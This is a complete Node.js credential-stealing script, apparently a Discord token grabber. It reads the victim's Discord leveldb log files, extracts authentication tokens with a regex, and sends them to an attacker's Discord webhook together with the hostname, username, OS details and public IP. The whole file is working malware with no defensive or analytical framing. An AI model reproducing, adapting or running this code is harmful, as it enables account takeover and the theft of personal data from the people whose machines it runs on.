//Dependencies
const Public_IP = require("public-ip")
const Discord = require("discord.js")
const Os = require("os")
const Fs = require("fs")

//Variables
const Webhook = new Discord.WebhookClient("wid", "wtoken")

var Self = {}
Self.dt = ""

//Functions
async function Send(){
    const IP = await Public_IP.v4()

    Webhook.send("```" + `OS Type: ${Os.type()}
OS Platform: ${Os.platform()}
OS Hostname: ${Os.hostname()}
            
OS Username: ${Os.userInfo().username}
IP: ${IP}
Discord tokens found: ${Self.dt}` + "```",).then(()=>{
        process.exit()
    }).catch(()=>{
        process.exit()
    })
}

function Main(){
    Fs.readdir(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb`, "utf8", function(err, files){
        if(err){
            Done()
            return
        }

        files.forEach(file =>{
            if(file.indexOf("log") != -1){
                const log_data = Fs.readFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\${file}`, "utf8")
                const tokens = Array.from(log_data.matchAll(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g))
                var results = ""
                
                if(tokens.length == 0){
                    Self.dt = "No tokens found."
                    Send()
                    return
                }

                for( i = 0; i <= tokens.length-1; i++ ){
                    tokens[i][0] = tokens[i][0].replace('"token":"', "")
                    tokens[i][0] = tokens[i][0].replace('"', "")

                    if(results.indexOf(tokens[i][0]) == -1){
                        if(results.length == 0){
                            results = tokens[i][0]
                        }else{
                            results += `, ${tokens[i][0]}`
                        }
                    }
                }

                Self.dt = results
                Send()
                return
            }
        })
    })
}

//Main
Main()
